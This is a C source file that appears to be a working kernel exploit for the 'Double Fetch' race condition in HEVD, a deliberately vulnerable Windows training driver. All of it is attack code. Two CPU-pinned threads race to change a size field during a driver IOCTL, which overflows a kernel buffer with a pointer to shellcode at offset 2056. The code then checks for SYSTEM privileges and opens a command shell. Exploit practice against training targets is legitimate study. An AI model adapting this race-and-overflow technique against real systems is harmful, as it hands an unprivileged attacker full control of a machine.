#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <psapi.h> // for EmptyWorkingSet()

#include <PwnLib.h>
#include <hevd.h>

#define IOCTL_CODE IOCTL_HEVD_DOUBLE_FETCH
#define NB_CPU 2
#define CPU_ID_0 0
#define CPU_ID_1 1


HANDLE hDevice = INVALID_HANDLE_VALUE;
uint64_t qUserData[2] = {0};
DWORD dwInBufferSize = 0;
LPVOID lpInBuffer = NULL;
LPVOID lpShellcode = NULL;
BOOL g_IsSystem = FALSE;


DWORD Racer0(LPVOID lpParams)
{
        UNREFERENCED_PARAMETER(lpParams);

        while(!g_IsSystem){
                qUserData[1] = 2056+8; //GetPageSize();
        }

        return 0;
}


DWORD Racer1(LPVOID lpParams)
{
        BOOL bResult;
        DWORD dwBytesReturned;
        UNREFERENCED_PARAMETER(lpParams);
        UNREFERENCED_LOCAL_VARIABLE(bResult);

        qUserData[0] = (uint64_t)lpInBuffer;

        while(!g_IsSystem){
                qUserData[1] = 0x800;

                bResult = DeviceIoControl(hDevice,
                                        IOCTL_CODE,
                                        qUserData,
                                        0x10,
                                        NULL,
                                        0,
                                        &dwBytesReturned,
                                        (LPOVERLAPPED) NULL);

                //info("Checking if PID=%ld is SYSTEM\n", GetProcessId(GetCurrentProcess()));
                if(CheckIsSystem()==TRUE){
                        ok("Success\n");
                        g_IsSystem = TRUE;
                        info("starting new process as SYSTEM\n");
                        PopupCmd();
                }
        }

        return 0;
}


BOOL HevdIoControl()
{
        info("Getting handle for device '%s' with code %#x\n", DRIVER_PATH, IOCTL_CODE);

        hDevice = CreateFileA(DRIVER_PATH,
                        GENERIC_READ|GENERIC_WRITE,
                        FILE_SHARE_READ|FILE_SHARE_WRITE,
                        NULL,
                        OPEN_EXISTING,
                        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
                        NULL);
        if (hDevice == INVALID_HANDLE_VALUE){
                perr("CreateFileA failed");
                return FALSE;
        }
        ok("Got device handle %#x\n", hDevice);


        info("initializing the racing threads...\n");
        HANDLE hThreads[2] = {0};
        hThreads[0] = CreateThread(
                                NULL,
                                0x1000,
                                Racer0,
                                NULL,
                                CREATE_SUSPENDED,
                                NULL
        );
        if (hThreads[0] == NULL) {
                perr("CreateThread(0) failed");
                goto CloseDevice_loc;
        }

        hThreads[1] = CreateThread(
                                NULL,
                                0x1000,
                                Racer1,
                                NULL,
                                CREATE_SUSPENDED,
                                NULL
        );
        if (hThreads[1] == NULL) {
                CloseHandle(hThreads[0]);
                perr("CreateThread(1) failed");
                goto CloseDevice_loc;
        }

        SetThreadPriority(hThreads[0], THREAD_PRIORITY_HIGHEST);
        SetThreadPriority(hThreads[1], THREAD_PRIORITY_BELOW_NORMAL);

        SetThreadAffinityMask(hThreads[0], CPU_ID_0);
        SetThreadAffinityMask(hThreads[1], CPU_ID_1);


        info("start the race...\n");

        EmptyWorkingSet(GetCurrentProcess());
        YieldProcessor();

        ResumeThread(hThreads[0]);
        ResumeThread(hThreads[1]);




        WaitForMultipleObjects(NB_CPU, hThreads, TRUE, INFINITE);
        for(int i=0; i<NB_CPU; i++){
                CloseHandle(hThreads[i]);
        }


CloseDevice_loc:

        if (hDevice != INVALID_HANDLE_VALUE){
                CloseHandle(hDevice);
        }

        return TRUE;
}


int main(int argc, char** argv, char** envp)
{
        UNREFERENCED_PARAMETER(argc);
        UNREFERENCED_PARAMETER(argv);
        UNREFERENCED_PARAMETER(envp);

        info("HEVD - Double Fetch exploit ... (%d)\n", GetProcessId(GetCurrentProcess()));

        info("preparing the payload...\n");
        // dwInBufferSize = GetPageSize();
        // lpInBuffer = (LPVOID)CreateDeBruijnPattern(dwInBufferSize); // pwn cyclic -n 8 -l 0x6b61616161616168 -> 2056
        dwInBufferSize = 2056+8;
        lpInBuffer = VirtualAlloc(NULL, dwInBufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE | PAGE_NOCACHE);

        //RtlFillMemory(lpInBuffer, dwInBufferSize, '\x41');
        ok("payload=%p\n", lpInBuffer);

        lpShellcode = AllocatePageWithShellcode();
        ok("shellcode=%p\n", lpShellcode);


        uint64_t *ptr = (uint64_t*) (uint8_t*)(lpInBuffer + 2056);
        info("inserting shellcode pointer at %p\n", ptr);
        *ptr = (uint64_t)lpShellcode;


        ok("ok, we're good to go...\n");

        getchar();


        info("starting exploit for Double Fetch...\n");

        HevdIoControl();


        info("Free the payload resources...\n");

        if(lpInBuffer)
                VirtualFree(lpInBuffer, dwInBufferSize, MEM_DECOMMIT);

        if(lpShellcode)
                VirtualFree(lpShellcode, GetPageSize(), MEM_DECOMMIT);

        if(g_IsSystem)
                return EXIT_SUCCESS;

        return EXIT_FAILURE;
}
